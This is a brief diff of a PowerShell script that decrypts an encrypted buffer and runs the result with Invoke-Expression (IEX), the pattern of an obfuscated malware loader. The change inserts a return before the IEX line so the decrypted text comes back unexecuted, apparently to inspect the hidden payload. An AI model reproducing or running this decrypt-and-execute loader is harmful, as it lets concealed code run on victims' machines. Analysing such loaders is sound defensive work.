@@ -38,6 +38,6 @@ $CryptoStream2.Write($InputBytes2, 0, $InputBytes2.Length)
 [byte[]]$DEncrypted2 = $MemoryStream2.ToArray()
 
 $DEncrypteds2 = [Text.Encoding]::utf8.GetString($DEncrypted2)
-
+return $DEncrypteds2
 IEX ($DEncrypteds2)
 }
